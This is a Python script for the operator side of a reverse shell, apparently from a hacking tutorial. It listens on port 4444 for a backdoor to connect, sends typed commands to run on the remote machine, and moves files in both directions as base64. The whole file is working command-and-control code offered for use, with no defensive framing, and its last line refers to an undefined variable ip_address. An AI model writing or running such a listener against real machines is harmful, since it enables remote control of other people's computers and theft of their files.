#!/usr/bin/env python

import socket, json
import base64

class Listener:

    def __init__(self, ip, port):
        """Start listener server allowing to reuse sockets."""
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #Change any option on your listener object
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port)) #THE PORT MUST NOT BE USED BY SYSTEM.
        listener.listen(0) #Backlog queue
        print("Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print("Got a connection from " + str(address) + "!")

    def reliable_send(self, data):
        """Instead of socket send method, convert data into JSON object."""
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        """Return the JSON object to a regular string."""
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                #print("Received!")
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        """Send command and receive output."""
        self.reliable_send(command)
        #print("Sent!")

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def download_file(self, path, content):
        """Creates a new empty file using base 64 decoding."""
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "Download successful!"

    def read_file(self, path):
        """Read a file using base 64 encoding"""
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        """Execute the program by adding a command."""
        while True:
            command = input(">")
            #To send command as a list (send command to change directory)
            command = command.split(" ")

            try:
                #To upload a file
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(str(file_content))
                    #print(command)

                result = self.execute_remotely(command)

                #To download a file
                if command[0] == "download" and "Error" not in result:
                    result = self.download_file(command[1], result)
            except Exception:
                result = "Error during command execution."

            print(result)


my_listener = Listener(ip_address, 4444)
my_listener.run()
